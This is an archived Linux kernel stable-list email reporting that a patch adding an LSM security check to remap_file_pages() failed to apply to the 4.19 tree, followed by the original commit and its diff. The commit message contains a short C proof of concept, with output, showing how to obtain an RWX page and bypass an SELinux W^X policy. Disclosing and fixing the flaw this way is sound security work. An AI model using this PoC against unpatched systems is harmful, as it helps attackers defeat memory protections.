Return-Path: <stable+bounces-78328-lists+stable=lfdr.de@vger.kernel.org>
X-Original-To: lists+stable@lfdr.de
Delivered-To: lists+stable@lfdr.de
Received: from am.mirrors.kernel.org (am.mirrors.kernel.org [IPv6:2604:1380:4601:e00::3])
	by mail.lfdr.de (Postfix) with ESMTPS id 7893F98B56E
	for <lists+stable@lfdr.de>; Tue,  1 Oct 2024 09:25:13 +0200 (CEST)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by am.mirrors.kernel.org (Postfix) with ESMTPS id 23CCF1F21BE0
	for <lists+stable@lfdr.de>; Tue,  1 Oct 2024 07:25:13 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id B09ED1BD009;
	Tue,  1 Oct 2024 07:25:08 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="1tp2G/12"
X-Original-To: stable@vger.kernel.org
Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6E0E01BCA0A
	for <stable@vger.kernel.org>; Tue,  1 Oct 2024 07:25:08 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1727767508; cv=none; b=CnlPfmY8XI8meXTW29uPeyq9LIU4uKZfrysik81zItCVLtzq3X3bpGqaPCeywqfFyVfJo5OFM3SYapP7+UvRYKJS4FI2XUdDCi+NOOFXlPvmpYE4mDJBxkQf7tt87tCVaolHRzClDqx/lVw0JYorcX8YrSn0HoUdbslVeWPaT0c=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1727767508; c=relaxed/simple;
	bh=+1R2yi06H+JlN1257HvBYs4OwVV4fvWdoOVvFj2uuwY=;
	h=Subject:To:Cc:From:Date:Message-ID:MIME-Version:Content-Type; b=CAdcgMMyjnXuAvFzx5rrwDoDkKtW2y9AFtA0eans6WeyXYXQ43a4+0uNm8bX9QSynlBjsUXxt59YzDUhxW3gYLdMHwPegjsy0Emg34jFsmJzk46DzE+bJyU5ve5RZeIblcaXyC2QtG1Io1RHKNW9SUFXKkMSQG10hIJ3YvIIb88=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=1tp2G/12; arc=none smtp.client-ip=10.30.226.201
Received: by smtp.kernel.org (Postfix) with ESMTPSA id A4C2DC4CECF;
	Tue,  1 Oct 2024 07:25:07 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=linuxfoundation.org;
	s=korg; t=1727767508;
	bh=+1R2yi06H+JlN1257HvBYs4OwVV4fvWdoOVvFj2uuwY=;
	h=Subject:To:Cc:From:Date:From;
	b=1tp2G/12TJOvE8EuvbCJvyDq7d+O9A9u1HmPw5rWs2AbmA8dwJ5+/dnOSYgLBK46T
	 8q6GEfVDIvaDYFMYJUqiMMYmLQFrRn2UxHM0Nx5Ttl0Y2jkEn3uo/knO7F1ncsyefl
	 vUOdEn3U7LN0YcDb5qeNYAQpjF3bacoscY8AIAi0=
Subject: FAILED: patch "[PATCH] mm: call the security_mmap_file() LSM hook in" failed to apply to 4.19-stable tree
To: ebpqwerty472123@gmail.com,paul@paul-moore.com,stephen.smalley.work@gmail.com
Cc: <stable@vger.kernel.org>
From: <gregkh@linuxfoundation.org>
Date: Tue, 01 Oct 2024 09:25:05 +0200
Message-ID: <2024100103-banish-batboy-00df@gregkh>
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=ANSI_X3.4-1968
Content-Transfer-Encoding: 8bit


The patch below does not apply to the 4.19-stable tree.
If someone wants it applied there, or to any other stable or longterm
tree, then please email the backport, including the original git commit
id to <stable@vger.kernel.org>.

To reproduce the conflict and resubmit, you may use the following commands:

git fetch https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/ linux-4.19.y
git checkout FETCH_HEAD
git cherry-pick -x ea7e2d5e49c05e5db1922387b09ca74aa40f46e2
# <resolve conflicts, build, test, etc.>
git commit -s
git send-email --to '<stable@vger.kernel.org>' --in-reply-to '2024100103-banish-batboy-00df@gregkh' --subject-prefix 'PATCH 4.19.y' HEAD^..

Possible dependencies:

ea7e2d5e49c0 ("mm: call the security_mmap_file() LSM hook in remap_file_pages()")
592b5fad1677 ("mm: Re-introduce vm_flags to do_mmap()")
183654ce26a5 ("mmap: change do_mas_munmap and do_mas_aligned_munmap() to use vma iterator")
0378c0a0e9e4 ("mm/mmap: remove preallocation from do_mas_align_munmap()")
92fed82047d7 ("mm/mmap: convert brk to use vma iterator")
baabcfc93d3b ("mm/mmap: fix typo in comment")
c5d5546ea065 ("maple_tree: remove the parameter entry of mas_preallocate")
675eaca1f441 ("mm/mmap: properly unaccount memory on mas_preallocate() failure")
6c28ca6485dd ("mmap: fix do_brk_flags() modifying obviously incorrect VMAs")
f5ad5083404b ("mm: do not BUG_ON missing brk mapping, because userspace can unmap it")
cc674ab3c018 ("mm/mmap: fix memory leak in mmap_region()")
120b116208a0 ("maple_tree: reorganize testing to restore module testing")
a57b70519d1f ("mm/mmap: fix MAP_FIXED address return on VMA merge")
5789151e48ac ("mm/mmap: undo ->mmap() when mas_preallocate() fails")
deb0f6562884 ("mm/mmap: undo ->mmap() when arch_validate_flags() fails")
28c5609fb236 ("mm/mmap: preallocate maple nodes for brk vma expansion")
763ecb035029 ("mm: remove the vma linked list")
8220543df148 ("nommu: remove uses of VMA linked list")
67e7c16764c3 ("mm/mmap: change do_brk_munmap() to use do_mas_align_munmap()")
11f9a21ab655 ("mm/mmap: reorganize munmap to use maple states")

thanks,

greg k-h

------------------ original commit in Linus's tree ------------------

From ea7e2d5e49c05e5db1922387b09ca74aa40f46e2 Mon Sep 17 00:00:00 2001
From: Shu Han <ebpqwerty472123@gmail.com>
Date: Tue, 17 Sep 2024 17:41:04 +0800
Subject: [PATCH] mm: call the security_mmap_file() LSM hook in
 remap_file_pages()

The remap_file_pages syscall handler calls do_mmap() directly, which
doesn't contain the LSM security check. And if the process has called
personality(READ_IMPLIES_EXEC) before and remap_file_pages() is called for
RW pages, this will actually result in remapping the pages to RWX,
bypassing a W^X policy enforced by SELinux.

So we should check prot by security_mmap_file LSM hook in the
remap_file_pages syscall handler before do_mmap() is called. Otherwise, it
potentially permits an attacker to bypass a W^X policy enforced by
SELinux.

The bypass is similar to CVE-2016-10044, which bypass the same thing via
AIO and can be found in [1].

The PoC:

$ cat > test.c

int main(void) {
	size_t pagesz = sysconf(_SC_PAGE_SIZE);
	int mfd = syscall(SYS_memfd_create, "test", 0);
	const char *buf = mmap(NULL, 4 * pagesz, PROT_READ | PROT_WRITE,
		MAP_SHARED, mfd, 0);
	unsigned int old = syscall(SYS_personality, 0xffffffff);
	syscall(SYS_personality, READ_IMPLIES_EXEC | old);
	syscall(SYS_remap_file_pages, buf, pagesz, 0, 2, 0);
	syscall(SYS_personality, old);
	// show the RWX page exists even if W^X policy is enforced
	int fd = open("/proc/self/maps", O_RDONLY);
	unsigned char buf2[1024];
	while (1) {
		int ret = read(fd, buf2, 1024);
		if (ret <= 0) break;
		write(1, buf2, ret);
	}
	close(fd);
}

$ gcc test.c -o test
$ ./test | grep rwx
7f1836c34000-7f1836c35000 rwxs 00002000 00:01 2050 /memfd:test (deleted)

Link: https://project-zero.issues.chromium.org/issues/42452389 [1]
Cc: stable@vger.kernel.org
Signed-off-by: Shu Han <ebpqwerty472123@gmail.com>
Acked-by: Stephen Smalley <stephen.smalley.work@gmail.com>
[PM: subject line tweaks]
Signed-off-by: Paul Moore <paul@paul-moore.com>

diff --git a/mm/mmap.c b/mm/mmap.c
index d0dfc85b209b..18fddcce03b8 100644
--- a/mm/mmap.c
+++ b/mm/mmap.c
@@ -3198,8 +3198,12 @@ SYSCALL_DEFINE5(remap_file_pages, unsigned long, start, unsigned long, size,
 		flags |= MAP_LOCKED;
 
 	file = get_file(vma->vm_file);
+	ret = security_mmap_file(vma->vm_file, prot, flags);
+	if (ret)
+		goto out_fput;
 	ret = do_mmap(vma->vm_file, start, size,
 			prot, flags, 0, pgoff, &populate, NULL);
+out_fput:
 	fput(file);
 out:
 	mmap_write_unlock(mm);


